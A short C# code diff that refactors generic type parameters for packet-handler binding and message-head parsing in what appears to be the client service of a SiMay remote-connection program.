@@ -43,7 +43,7 @@ namespace SiMay.ServiceCore.MainService
         private TcpSocketSaeaClientAgent _clientAgent;
         private TcpSocketSaeaSession _session;
         private ManagerTaskQueue _taskQueue = new ManagerTaskQueue();
-        private PacketModelBinder<TcpSocketSaeaSession> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession>();
+        private PacketModelBinder<TcpSocketSaeaSession, MessageHead> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession, MessageHead>();
         public MainService(StartParameterEx startParameter)
         {
             while (true) //第一次解析域名,直至解析成功
@@ -212,7 +212,7 @@ namespace SiMay.ServiceCore.MainService
                     case TcpSocketCompletionNotify.OnDataReceived:
                         var workType = (ConnectionWorkType)session.AppTokens[0];
                         if (workType == ConnectionWorkType.MAINCON)
-                            this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);
+                            this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead<MessageHead>(), this);
                         else if (workType == ConnectionWorkType.WORKCON)
                             ((ServiceManager)session.AppTokens[1]).OnNotifyProc(notify, session);//工作连接处理函数
                         break;
